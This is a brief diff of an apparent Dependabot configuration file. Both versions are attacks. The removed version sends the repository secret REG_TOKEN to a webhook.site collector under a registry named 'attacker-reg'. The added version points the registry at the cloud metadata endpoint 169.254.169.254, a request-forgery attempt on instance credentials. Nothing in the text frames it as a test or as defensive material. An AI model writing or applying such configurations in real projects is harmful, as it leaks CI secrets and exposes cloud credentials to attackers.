@@ -1,8 +1,8 @@
 version: 2
 registries:
-  attacker-reg:
+  cloud-md:
     type: npm-registry
-    url: "https://webhook.site/cbd0ed4b-2205-48dc-9d9b-9771154812ae"
+    url: "http://169.254.169.254/latest/meta-data"
     token: "${{secrets.REG_TOKEN}}"
 updates:
   - package-ecosystem: "npm"
@@ -11,4 +11,4 @@ updates:
       interval: "daily"
     target-branch: "main"
     registries:
-      - "attacker-reg"
+      - "cloud-md"
